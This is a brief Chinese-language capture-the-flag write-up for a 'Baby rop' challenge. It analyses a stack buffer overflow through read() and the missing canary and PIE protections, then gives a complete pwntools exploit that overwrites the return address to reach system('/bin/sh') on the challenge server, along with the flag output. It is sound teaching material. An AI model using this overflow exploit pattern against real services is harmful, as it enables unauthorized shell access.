# PWN WP Baby rop

IDA先分析一下`main()`:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-88h]

  puts(msg);
  puts(txt);
  read(0, &v4, 256uLL);
  return puts(msa);
}
```

其中的`read()`显然是可以利用的。然后`main()`往下地址挨着就有如下可用来控制的`system("/bin/sh")`。

```
.text:0000000000400618 root            proc near
.text:0000000000400618                 push    rbp
.text:0000000000400619                 mov     rbp, rsp
.text:000000000040061C                 mov     rdi, offset com ; "/bin/sh"
.text:0000000000400626                 call    _system
.text:000000000040062B                 nop
.text:000000000040062C                 pop     rbp
.text:000000000040062D                 retn
.text:000000000040062D root            endp
```

---

再看看程序的防护措施：

```shell
gef➤  checksec hello
[+] checksec for '/root/pjx/hello'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

没有多少防护，Canary也没有。

---

容易写出exploit

```python
from pwn import *

p = remote("pwnto.fun", 10000)

sysaddr = 0x000000000040061C
payload = 'A' * 136 + p64(sysaddr)

p.send(payload)
p.interactive()
```

*补充说明下：padding的长度是IDA分析`__int64 v4; // [rsp+0h] [rbp-88h]`这个0x88得到的*

运行:

```shell
root@pjx:~/pjx# python hello.py
[+] Opening connection to pwnto.fun on port 10000: Done
[*] Switching to interactive mode
Syc{S0_easy_and_S0_good}
```

